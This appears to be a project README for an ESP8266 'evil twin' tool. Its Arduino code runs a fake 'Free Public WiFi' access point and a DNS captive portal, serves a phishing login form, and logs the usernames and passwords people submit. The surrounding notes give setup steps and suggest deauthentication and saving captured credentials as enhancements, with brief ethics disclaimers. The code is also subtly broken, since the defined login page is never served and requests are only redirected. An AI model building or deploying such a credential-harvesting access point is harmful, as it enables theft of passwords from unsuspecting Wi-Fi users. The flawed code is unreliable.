# Evil-Twin_Node_MCU



```bash
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// Configuration
const char* AP_SSID = "Free Public WiFi";  // Fake AP name
const char* REDIRECT_URL = "http://login.required";  // Phishing URL

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// HTML for captive portal
const char* loginPage = 
R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<title>Network Login Required</title>
<style>
  body { font-family: Arial, sans-serif; background: #f0f0f0; }
  .container { background: white; width: 300px; margin: 100px auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
  input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
  button { background: #4CAF50; color: white; padding: 14px 20px; border: none; cursor: pointer; width: 100%; }
</style>
</head>
<body>
<div class="container">
  <h2>Network Login</h2>
  <p>Enter credentials to access Internet</p>
  <form action="/login" method="POST">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
</div>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  
  // Configure AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID);

  // Start DNS server (captive portal)
  dnsServer.start(DNS_PORT, "*", apIP);

  // Web server handlers
  webServer.on("/", handleRoot);
  webServer.on("/login", handleLogin);
  webServer.onNotFound(handleRoot);  // Redirect all requests
  webServer.begin();

  Serial.println("\nEvil Twin AP Running!");
  Serial.print("SSID: ");
  Serial.println(AP_SSID);
  Serial.print("IP: ");
  Serial.println(apIP);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

// Handle captive portal redirect
void handleRoot() {
  webServer.sendHeader("Location", REDIRECT_URL, true);
  webServer.send(302, "text/plain", "");
}

// Process captured credentials
void handleLogin() {
  String username = webServer.arg("username");
  String password = webServer.arg("password");
  
  Serial.println("\n[+] Credentials Captured!");
  Serial.print("Username: ");
  Serial.println(username);
  Serial.print("Password: ");
  Serial.println(password);

  // Redirect after capture
  webServer.sendHeader("Location", "http://example.com", true);
  webServer.send(302, "text/plain", "Login Successful");
}

// Not needed but included for clarity
void handleNotFound() {
  handleRoot();
}
```

> ## Note
>  - You can modify certain parameters in the code to fit your requirements:
>  - **Redirected URL:** Change the URL users are sent to after submitting credentials to match your test scenario.
>  - **SSID:** Set your own Wi-Fi network name to attract targets or for testing purposes.
>  - **DNS:** Adjust DNS settings if you want to redirect to a different captive portal or server.
>  - Make sure to update these variables in the source code before uploading to your NodeMCU device.

>> ## Ethical Considerations
> - **Legal Compliance:** Only test on your own networks
> - **Disclosure:** Add disclaimer to login page in real tests
> - **Data Handling:** Never store captured credentials permanently
> - **Permissions:** Requires written consent for penetration testing

## Key Components

**Fake Access Point:**
- Creates Wi-Fi network with specified SSID
- Uses IP 192.168.1.1 for gateway

**Captive Portal:**
- DNS server redirects all domains to ESP
- Any HTTP request shows login page
- Professional-looking login form

**Credential Harvesting:**
- Captures username/password via POST
- Prints credentials to serial monitor
- Shows "success" redirect after submission

## Setup Instructions
- Upload code to NodeMCU
- Open Serial Monitor (115200 baud)
- Connect device to Free Public WiFi
- Attempt to browse any website
- Enter test credentials in login page
- Observe credentials in Serial Monitor

## Ethical Considerations
- **Legal Compliance:** Only test on your own networks
- **Disclosure:** Add disclaimer to login page in real tests
- **Data Handling:** Never store captured credentials permanently
- **Permissions:** Requires written consent for penetration testing

## Enhancements (Optional)
- Add EAP/TLS encryption simulation
- Implement WiFi deauthentication (requires external hardware)
- Add SSL/TLS (requires HTTPS library)
- Store credentials to SPIFFS/SD card
